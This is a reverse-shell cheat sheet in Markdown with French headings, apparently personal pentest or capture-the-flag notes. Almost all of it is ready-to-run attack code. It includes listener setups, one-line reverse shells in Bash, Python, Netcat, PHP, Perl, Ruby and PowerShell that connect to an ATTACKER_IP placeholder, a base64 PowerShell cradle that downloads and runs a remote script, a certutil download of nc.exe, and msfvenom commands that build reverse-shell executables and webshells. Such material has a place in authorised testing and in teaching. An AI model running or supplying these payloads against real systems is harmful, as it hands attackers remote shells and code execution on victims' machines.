# Reverse Shells

> Ref : https://revshells.com

---

## Listeners

```bash
# Netcat
nc -lvnp 4444

# rlwrap (meilleur confort avec readline)
rlwrap nc -lvnp 4444

# Metasploit
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; run"

# pwncat (auto-upgrade + persistence)
pwncat-cs -lp 4444
```

---

## Linux

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Netcat
```bash
nc -e /bin/bash ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### PHP
```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## Windows

### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell (base64)
```bash
# Générer le payload encodé
echo -n 'IEX(New-Object Net.WebClient).downloadString("http://ATTACKER_IP/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
# Exécuter
powershell -enc <BASE64>
```

### Certutil + exe
```cmd
certutil -urlcache -split -f http://ATTACKER_IP/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe
```

---

## Upgrade du shell

```bash
# 1. Spawn un PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background le shell
# Ctrl+Z

# 3. Configurer le terminal local
stty raw -echo; fg

# 4. Set les variables
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 160
```

---

## Msfvenom - Payloads courants

```bash
# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf

# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe

# PHP webshell
msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -f raw > shell.php

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f asp > shell.asp

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx
```
